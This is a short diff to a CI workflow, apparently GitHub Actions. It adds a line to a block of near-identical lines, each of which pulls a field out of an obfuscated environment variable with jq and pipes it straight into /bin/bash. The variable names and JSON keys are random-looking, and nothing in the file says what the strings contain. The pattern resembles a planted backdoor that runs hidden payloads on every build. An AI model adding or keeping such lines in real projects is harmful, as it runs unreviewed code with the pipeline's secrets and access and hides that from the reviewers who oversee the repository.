@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$u3" | jq -r .s48 | /bin/bash
           printf '%s' "$x093" | jq -r .xedop25730 | /bin/bash
           echo $apgl71921 | jq -r .cdb37 | /bin/bash
+          printf '%s' "$sgns3" | jq -r .xgzqi4 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
